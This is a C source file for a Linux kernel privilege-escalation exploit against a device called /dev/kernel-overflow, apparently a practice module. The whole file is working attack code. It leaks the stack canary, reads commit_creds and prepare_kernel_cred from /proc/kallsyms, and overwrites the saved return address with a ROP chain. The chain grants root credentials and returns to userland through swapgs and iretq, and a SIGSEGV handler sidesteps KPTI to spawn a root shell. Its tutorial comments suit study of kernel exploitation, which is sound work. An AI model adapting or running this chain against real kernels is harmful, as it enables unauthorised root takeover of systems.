#define _GNU_SOURCE
#include <fcntl.h>
#include <inttypes.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>


#define KERN_MODULE "/dev/kernel-overflow"

#define WORD_SIZE 8
#define BUF_SIZE 0x100

// Globals used in shellcode
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long kernel_base;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long user_rip;

void exit_and_log(char *msg) {
  fprintf(stderr, "%s", msg);
  exit(-1);
}

/*
 * Once our gid and uid are 0 we are root!
 * Stop running this and run a shell instead
 */
void drop_shell(void) {
  printf("[*] Returned to userland\n");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  if (getuid() == 0 && getgid() == 0) {
    printf("[*] UID: %d\n", getuid());
    printf("[*] GID: %d\n", getuid());
    execve(argv[0], argv, envp);
  }
  exit_and_log("Failed to priv\n");
}

/*
 * When going from kernel mode to user mode
 * we need to restore the register state.
 */
void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
  printf("Saved cs, ss, rsp, rflags registers\n");
}

/*
 * Our kernel addresses for commit_creds and prepare_kernel_cred
 * are available in /proc/kallsyms. We can read them here and
 * store them globally to reference later
 */
void get_kernel_addresses() {
  FILE *fp;
  char *line = NULL;
  size_t len = 0;
  ssize_t read;

  fp = fopen("/proc/kallsyms", "r");
  if (fp == NULL)
    exit_and_log("failed to open kallsyms\n");

  while ((read = getline(&line, &len, fp)) != -1) {
    if (strstr(line, "prepare_kernel_cred") != NULL) {
      prepare_kernel_cred = strtoul(line, NULL, 16);
    }
    if (strstr(line, "commit_creds") != NULL) {
      commit_creds = strtoul(line, NULL, 16);
    }
    if (strstr(line, " startup_64") != NULL) {
      kernel_base = strtoul(line, NULL, 16);
    }
  }

  fclose(fp);
  if (line)
    free(line);

  printf("prepare_kernel_cred\t: 0x%lX\n", prepare_kernel_cred);
  printf("commit_creds\t\t: 0x%lX\n", commit_creds);
  printf("startup_64\t\t: 0x%lX\n", kernel_base);
}


unsigned long do_leak(int fd) {
  int bytes_read;
  unsigned long *buf = NULL;
  unsigned long stack_cookie;
  unsigned int cookie_offset = 16;

  buf = malloc(BUF_SIZE);
  if (buf == NULL)
    exit_and_log("Failed to malloc\n");

  memset(buf, '\x00', BUF_SIZE);

  bytes_read = read(fd, buf, BUF_SIZE);

  for (int i = 0; i < (BUF_SIZE / WORD_SIZE); i++) {
    if (i == cookie_offset) {
      printf("buf + 0x%X\t: %lX <------- Stack cookie\n", i * WORD_SIZE,
             buf[i]);
    } else {
      printf("buf + 0x%X\t: %lX\n", i * WORD_SIZE, buf[i]);
    }
  }

  stack_cookie = buf[cookie_offset];
  free(buf);

  return stack_cookie;
}

// 0xffffffff81001518 : pop rdi ; ret
unsigned long pop_rdi_ret = 0xffffffff81001518;
// 0xffffffff8100f915 : mov rax, rdi ; ret
unsigned long mov_rax_rdi = 0xffffffff8100f915;
// 0xffffffff81c00eaa : swapgs ; popfq ; ret
unsigned long swapgs_popfq_ret = 0xffffffff81c00eaa;
// ffffffff81023cc2:	48 cf                	iretq  

unsigned long iretq = 0xffffffff81023cc2;

void overwrite_pc(int fd, unsigned long stack_cookie, unsigned long kernel_base) {
  unsigned long *buf = NULL; //[BUF_SIZE];
  unsigned int cookie_offset = 16;
  int bytes_written;

  buf = malloc(BUF_SIZE);
  if (buf == NULL)
    exit_and_log("Failed to malloc\n");

  memset(buf, '\x00', BUF_SIZE);

  user_rip = (unsigned long)drop_shell;

  buf[cookie_offset] = stack_cookie;
  buf[cookie_offset + 1] = 0x4141414141414141;          // rbx
  buf[cookie_offset + 2] = 0x4141414141414242;          // rdx
  buf[cookie_offset + 3] = pop_rdi_ret;
  buf[cookie_offset + 4] = 0 ; // Argument for prepare_kernel_cred
  buf[cookie_offset + 5] = prepare_kernel_cred;
  buf[cookie_offset + 6] = mov_rax_rdi; // move cred struct to argument
  buf[cookie_offset + 7] = commit_creds;
  buf[cookie_offset + 8] = swapgs_popfq_ret;
  buf[cookie_offset + 9] = 0xDEADBEEF; // value for popfq
  buf[cookie_offset + 10] = iretq; // swap from kernel to userspace
  buf[cookie_offset + 11] = user_rip; // <-- here is drop shell function
  buf[cookie_offset + 12] = user_cs;
  buf[cookie_offset + 13] = user_rflags;
  buf[cookie_offset + 14] = user_sp;
  buf[cookie_offset + 15] = user_ss;

  // After this write we won't return to the
  // rest of this function
  bytes_written = write(fd, buf, BUF_SIZE);

  printf("Write returned %d\n", bytes_written);

  free(buf);
}

void main() {
  /*
   * Interacting with this kernel module is easy
   * just treat it like a file
   */

  int fd;
  unsigned long stack_cookie;

  fd = open(KERN_MODULE, O_RDWR);
  if (fd < 0)
    exit_and_log("Failed to open kernel module\n");

  /*
   * Just like a userspace buffer overflow, a stack
   * read will give us the stack cookie that we can
   * use when doing our kernel space overflow
   */
  stack_cookie = do_leak(fd);

  /*
   * Get prepare_kernel_cred and commit_creds using
   * /proc/kallsyms
   */
  get_kernel_addresses();

  /*
   * Get registers that we'll need to restore later
   */
  save_state();

  /*
   * KPTI will issue a SEGFAULT when returning to userspace
   * So we can simply register a signal handler to catch
   * this signal and run the drop_shell function instead
   */ 
  signal(SIGSEGV, drop_shell);

  /*
   * Overwrite the program counter and execute our
   * shellcode!
   */
  overwrite_pc(fd, stack_cookie, kernel_base);

  printf("At end of main\n");

  close(fd);
}
